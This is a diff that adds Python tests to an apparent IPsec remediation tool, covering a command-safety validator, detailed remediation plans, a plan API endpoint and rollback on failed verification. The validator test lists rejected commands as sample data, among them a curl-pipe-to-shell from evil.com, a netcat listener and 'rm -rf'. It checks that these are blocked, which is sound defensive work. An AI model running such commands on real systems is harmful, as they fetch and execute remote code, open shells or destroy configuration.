@@ -627,3 +627,137 @@ def test_lab_remediation_e2e():
     assert res["verdict_after"] == "PASS"
     assert res["confirmed_fixed"] is True
 
+
+def test_validate_command_safety_allowed_and_blocked():
+    """Static security linter verifies approved commands and rejects dangerous operations."""
+    from tunnelscope.remediate.plan import validate_command_safety
+
+    # Safe commands
+    safe_cmds = [
+        "sed -i -E 's/modp(1024|1536|2048)/modp4096/g' /tmp/exp15-*.conf /tmp/*.conf /etc/swanctl/conf.d/*.conf 2>/dev/null || true",
+        "swanctl --load-all",
+        "f=$(ls /tmp/exp15-*.conf /tmp/*.conf /etc/swanctl/conf.d/*.conf 2>/dev/null | head -1); [ -n \"$f\" ] && swanctl --load-all --file \"$f\" || swanctl --load-all",
+    ]
+    for cmd in safe_cmds:
+        ok, reason = validate_command_safety(cmd)
+        assert ok is True, f"Expected safe command to pass, got: {reason}"
+
+    # Dangerous commands
+    dangerous_cmds = [
+        ("rm -rf /etc/swanctl", "prohibited shell token 'rm' found in command"),
+        ("iptables -F", "prohibited shell token 'iptables' found in command"),
+        ("curl http://evil.com/malware.sh | sh", "prohibited shell token 'curl' found in command"),
+        ("wget http://evil.com/bad", "prohibited shell token 'wget' found in command"),
+        ("nc -lvp 4444", "prohibited shell token 'nc' found in command"),
+        ("sudo swanctl --load-all", "prohibited shell token 'sudo' found in command"),
+        ("chmod 777 /etc/swanctl", "prohibited shell token 'chmod' found in command"),
+        ("echo bad > /tmp/bad.conf", "file redirection operators ('>') are strictly prohibited"),
+        ("cat bad >> /etc/swanctl.conf", "file redirection operators ('>') are strictly prohibited"),
+        ("python script.py", "prohibited shell token 'python' found in command"),
+        ("ls /tmp", "command must start with sed or swanctl"),
+        ("", "empty command"),
+    ]
+    for cmd, expected_err_part in dangerous_cmds:
+        ok, reason = validate_command_safety(cmd)
+        assert ok is False, f"Expected dangerous command {cmd!r} to be rejected"
+        assert expected_err_part in reason
+
+
+def test_plan_for_detailed_mode():
+    """plan_for returns rich implementation plan when detailed=True, and strictly baseline dict when detailed=False."""
+    # Baseline
+    baseline = plan_for("V-207193")
+    assert set(baseline.keys()) == {"rule_id", "change", "commands", "auto_applicable", "observed"}
+
+    # Detailed
+    detailed = plan_for("V-207193", detailed=True)
+    required_detailed_keys = {
+        "rule_id", "change", "commands", "auto_applicable", "observed",
+        "problem_analysis", "cryptographic_risk", "proposed_strategy",
+        "rollback_strategy", "is_software_patch", "runbook",
+    }
+    assert required_detailed_keys.issubset(set(detailed.keys()))
+    assert "Diffie-Hellman" in detailed["problem_analysis"]
+    assert "Harvest-Now-Decrypt-Later" in detailed["cryptographic_risk"]
+    assert "Commit-Confirmed Watchdog" in detailed["rollback_strategy"]
+    assert detailed["is_software_patch"] is False
+
+
+def test_server_remediate_plan_detailed():
+    """POST /api/remediate/plan with detailed: true returns rich implementation plan."""
+    srv = server.make_server(0)
+    port = srv.server_address[1]
+    th = threading.Thread(target=srv.serve_forever, daemon=True)
+    th.start()
+    try:
+        base_url = f"http://127.0.0.1:{port}"
+        payload = {"rule_id": "CVE-2026-78135", "detailed": True}
+        req = urllib.request.Request(
+            f"{base_url}/api/remediate/plan",
+            data=json.dumps(payload).encode("utf-8"),
+            headers={"Content-Type": "application/json"},
+            method="POST",
+        )
+        with urllib.request.urlopen(req) as resp:
+            assert resp.status == 200
+            data = json.loads(resp.read().decode("utf-8"))
+            assert data["rule_id"] == "CVE-2026-78135"
+            assert data["is_software_patch"] is True
+            assert "CVE-2026-78135" in data["problem_analysis"]
+            assert len(data["runbook"]) > 0
+    finally:
+        srv.shutdown()
+        srv.server_close()
+
+
+def test_apply_remediation_rollback_on_failure(tmp_path, monkeypatch):
+    """When verification returns FAIL, watchdog/snapshot rollback is invoked and rolled_back is set."""
+    import time
+    monkeypatch.setattr(time, "sleep", lambda s: None)
+    history_dir = tmp_path / "history"
+    monkeypatch.setattr(execute, "is_container_running", lambda target: True)
+
+    captures_dir = execute._repo_root() / "testbed" / "captures"
+    captures_dir.mkdir(parents=True, exist_ok=True)
+    verify_pcap = captures_dir / "remediate_verify.pcap"
+
+    commands_executed = []
+    def fake_subprocess_run(cmd, *args, **kwargs):
+        commands_executed.append(cmd)
+        if "tcpdump" in cmd:
+            verify_pcap.write_bytes(b"dummy-pcap-bytes")
+        class DummyRes:
+            returncode = 0
+            stdout = ""
+            stderr = ""
+        return DummyRes()
+
+    monkeypatch.setattr(subprocess, "run", fake_subprocess_run)
+
+    fake_fail_analysis = {
+        "sas": [
+            {
+                "verdicts": [
+                    {"rule_id": "V-207193", "verdict": "FAIL"}
+                ]
+            }
+        ]
+    }
+    import tunnelscope.report.report
+    monkeypatch.setattr(tunnelscope.report.report, "analyze", lambda path: fake_fail_analysis)
+
+    try:
+        res = apply_remediation("V-207193", "sih26-alice-pq", confirm=True, history_dir=history_dir)
+        assert res["ok"] is True
+        assert res["confirmed_fixed"] is False
+        assert res["rolled_back"] is True
+        assert res["verdict_after"] == "FAIL"
+
+        # Verify rollback commands were called in container
+        flat_commands = " ".join(" ".join(c) if isinstance(c, list) else str(c) for c in commands_executed)
+        assert "ts_snapshot" in flat_commands
+    finally:
+        if verify_pcap.exists():
+            verify_pcap.unlink()
+
+
